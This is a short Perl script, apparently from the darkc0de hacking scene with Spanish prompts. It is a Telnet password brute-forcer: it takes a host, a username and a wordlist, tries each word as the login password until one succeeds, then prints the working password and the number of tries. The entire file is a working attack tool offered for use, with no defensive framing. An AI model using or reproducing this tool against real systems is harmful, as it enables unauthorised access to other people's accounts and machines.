#!/usr/bin/perl
#c0dex by m0x.lk
#BtTel.- RE & Hase
use Net::Telnet ();
system ("clear");
system ("cls");
system ("color f3");
print "\n";
print "\t\tC0dex by m0x.lk\n";
print "\n";
print "\t BtTel.- RE & HaSe * darkc0de\n";
print "\n";
sleep 1;
print "Host: ";
$host=<STDIN>;
print "\n\n";
print "Username: ";
$username=<STDIN>;
print "\n\n";
print "Diccionario: ";
$dict=<STDIN>;
print "\n\n";
$i = 1;
open (D,"<$dict") or die "Diccionario no encontrado\n";
while(<D>)
{
$try = $_;
    chomp $try;

        $t = new Net::Telnet (Host => $host);
        eval { $t->login($username, $try); };
        if ($@) {
print "\n";
print "[+] Obteniendo Pass";
print "\n";
                print $i++ . ": Fallo - $try\n";
        }
        else {
                print "'$try - $i intentos";
                last;
        }
        $t->close;
}
close(IN);